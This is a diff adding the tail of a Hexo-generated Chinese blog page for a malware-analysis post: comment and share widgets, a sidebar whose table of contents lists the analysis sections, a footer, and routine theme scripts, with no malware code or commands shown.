+      <li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
+      <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
+      <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
+      <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
+      <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+
+    </ul>
+    <div class="ds-share-icons-more">
+    </div>
+  </div>
+</div>
+      
+    </div>
+  </div>
+
+ </div>
+
+        
+            <!-- 多说热评文章-->
+            <p>热评文章</p>
+            <div class="ds-top-threads" data-range="weekly" data-num-items="4"></div>
+        
+
+        
+          <div class="comments" id="comments">
+            
+              <div class="ds-thread" data-thread-key="2013/12/03/3-virus-infected-tem81/"
+                   data-title="病毒分析-驱动感染型" data-url="http://blog.idhyt.xyz/2013/12/03/3-virus-infected-tem81/">
+              </div>
+            
+          </div>
+        
+      </div>
+
+      
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" src="/images/default_avatar.jpg" alt="idhyt" itemprop="image"/>
+          <p class="site-author-name" itemprop="name">idhyt</p>
+        </div>
+        <p class="site-description motion-element" itemprop="description">水中月.镜中花.浮华一片苍凉..</p>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">47</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            
+              <span class="site-state-item-count">5</span>
+              <span class="site-state-item-name">分类</span>
+              
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="/tags">
+              <span class="site-state-item-count">13</span>
+              <span class="site-state-item-name">标签</span>
+              </a>
+          </div>
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="menu-item-icon icon-next-feed"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="http://github.com/idhyt" target="_blank">GitHub</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/1706893103" target="_blank">Weibo</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.zhihu.com/people/idhyt" target="_blank">ZhiHu</a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+          <div class="cc-license motion-element" itemprop="license">
+            <a href="http://creativecommons.org/licenses/by-nc-sa/4.0" class="cc-opacity" target="_blank">
+              <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+      </section>
+
+      
+        <section class="post-toc-wrap sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator"></div>
+          <div class="post-toc">
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#调试环境："><span class="nav-number">1.</span> <span class="nav-text">调试环境：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#病毒简介"><span class="nav-number">2.</span> <span class="nav-text">病毒简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#病毒运行过程"><span class="nav-number">3.</span> <span class="nav-text">病毒运行过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#创建互斥事件检测自身是否运行"><span class="nav-number">3.1.</span> <span class="nav-text">创建互斥事件检测自身是否运行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#检测病毒是否已注册服务项（举例AppMgmt说明）"><span class="nav-number">3.2.</span> <span class="nav-text">检测病毒是否已注册服务项（举例AppMgmt说明）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#创建病毒运行服务项（举例6to4-dll说明）"><span class="nav-number">3.3.</span> <span class="nav-text">创建病毒运行服务项（举例6to4.dll说明）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#生成dll服务,释放DLL组建"><span class="nav-number">3.4.</span> <span class="nav-text">生成dll服务,释放DLL组建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#增加新的服务注册表项实现服务自启动"><span class="nav-number">3.5.</span> <span class="nav-text">增加新的服务注册表项实现服务自启动</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#开启服务，自删除"><span class="nav-number">3.6.</span> <span class="nav-text">开启服务，自删除</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#释放的DLL文件分析"><span class="nav-number">4.</span> <span class="nav-text">释放的DLL文件分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#检测自身是否运行"><span class="nav-number">4.1.</span> <span class="nav-text">检测自身是否运行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解密URL"><span class="nav-number">4.2.</span> <span class="nav-text">解密URL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#创建线程0x10003F33访问指定的链接"><span class="nav-number">4.3.</span> <span class="nav-text">创建线程0x10003F33访问指定的链接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#创建线程0x100018d7下载恶意文件并执行"><span class="nav-number">4.4.</span> <span class="nav-text">创建线程0x100018d7下载恶意文件并执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#创建线程0x10003A8D注册驱动服务，终止杀软进行"><span class="nav-number">4.5.</span> <span class="nav-text">创建线程0x10003A8D注册驱动服务，终止杀软进行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#创建线程0x10004618利用注册表映像文件劫持功能干扰杀软正常运行"><span class="nav-number">4.6.</span> <span class="nav-text">创建线程0x10004618利用注册表映像文件劫持功能干扰杀软正常运行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#劫持host，自保护"><span class="nav-number">4.7.</span> <span class="nav-text">劫持host，自保护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#创建线程0x1000311F感染系统文件"><span class="nav-number">4.8.</span> <span class="nav-text">创建线程0x1000311F感染系统文件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#感染exe文件"><span class="nav-number">4.8.1.</span> <span class="nav-text">感染exe文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#感染htm\html\asp\aspx"><span class="nav-number">4.8.2.</span> <span class="nav-text">感染htm\html\asp\aspx</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#感染RAR文件"><span class="nav-number">4.8.3.</span> <span class="nav-text">感染RAR文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#感染局域网"><span class="nav-number">4.8.4.</span> <span class="nav-text">感染局域网</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#感染可移动磁盘"><span class="nav-number">4.8.5.</span> <span class="nav-text">感染可移动磁盘</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#创建线程0x10005ACB下载恶意文件并运行"><span class="nav-number">4.9.</span> <span class="nav-text">创建线程0x10005ACB下载恶意文件并运行</span></a></li></ol></li></ol></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner"> <div class="copyright" >
+  
+  &copy; &nbsp;  2011 - 
+  <span itemprop="copyrightYear">2015</span>
+  <span class="with-love">
+    <i class="icon-next-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">idhyt</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+<div class="powered-by">
+</div>
+
+<div class="theme-info">
+    <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+    </script>
+    <span id="busuanzi_container_site_pv">
+        本站总访问量<a class="theme-link"><span id="busuanzi_value_site_pv"></span></a>次
+    </span>
+</div>
+
+
+ </div>
+    </footer>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+  
+    
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"idhyt"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+    
+     
+  	<script src="/js/ua-parser.min.js"></script>
+  	<script src="/js/hook-duoshuo.js"></script>
+  
+
+    
+  
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.5.1"></script>
+
+
+  <script type="text/javascript" src="/js/helpers.js?v=0.4.5.1"></script>
+  
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/js/motion_global.js?v=0.4.5.1" id="motion.global"></script>
+
+
+
+
+  <script type="text/javascript" src="/js/nav-toggle.js?v=0.4.5.1"></script>
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  
+<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.5.1" id="bootstrap.scrollspy.custom"></script>
+
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.motion.complete', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      var $indicator = $(indicator);
+      var opacity = action === 'show' ? 0.4 : 0;
+      $indicator.velocity ?
+        $indicator.velocity('stop').velocity({
+          opacity: opacity
+        }, { duration: 100 }) :
+        $indicator.stop().animate({
+          opacity: opacity
+        }, 100);
+    }
+
+  });
+</script>
+
+<script type="text/javascript" id="sidebar.nav">
+  $(document).ready(function () {
+    var html = $('html');
+    var TAB_ANIMATE_DURATION = 200;
+    var hasVelocity = $.isFunction(html.velocity);
+
+    $('.sidebar-nav li').on('click', function () {
+      var item = $(this);
+      var activeTabClassName = 'sidebar-nav-active';
+      var activePanelClassName = 'sidebar-panel-active';
+      if (item.hasClass(activeTabClassName)) {
+        return;
+      }
+
+      var currentTarget = $('.' + activePanelClassName);
+      var target = $('.' + item.data('target'));
+
+      hasVelocity ?
+        currentTarget.velocity('transition.slideUpOut', TAB_ANIMATE_DURATION, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', TAB_ANIMATE_DURATION)
+            .addClass(activePanelClassName);
+        }) :
+        currentTarget.animate({ opacity: 0 }, TAB_ANIMATE_DURATION, function () {
+          currentTarget.hide();
+          target
+            .stop()
+            .css({'opacity': 0, 'display': 'block'})
+            .animate({ opacity: 1 }, TAB_ANIMATE_DURATION, function () {
+              currentTarget.removeClass(activePanelClassName);
+              target.addClass(activePanelClassName);
+            });
+        });
+
+      item.siblings().removeClass(activeTabClassName);
+      item.addClass(activeTabClassName);
+    });
+
+    $('.post-toc a').on('click', function (e) {
+      e.preventDefault();
+      var targetSelector = escapeSelector(this.getAttribute('href'));
+      var offset = $(targetSelector).offset().top;
+      hasVelocity ?
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        }) :
+        $('html, body').stop().animate({
+          scrollTop: offset
+        }, 500);
+    });
+
+    // Expand sidebar on post detail page by default, when post has a toc.
+    var $tocContent = $('.post-toc-content');
+    if (isDesktop() && CONFIG.sidebar === 'post') {
+      if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+        displaySidebar();
+      }
+    }
+  });
+</script>
+
+
+
+  <script type="text/javascript">
+    $(document).ready(function () {
+      if (CONFIG.sidebar === 'always') {
+        displaySidebar();
+      }
+      if (isMobile()) {
+        FastClick.attach(document.body);
+      }
+    });
+  </script>
+
+  
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/lazyload.js"></script>
+  <script type="text/javascript">
+    $(function () {
+      $("#posts").find('img').lazyload({
+        placeholder: "/images/loading.gif",
+        effect: "fadeIn"
+      });
+    });
+  </script>
+</body>
+</html>
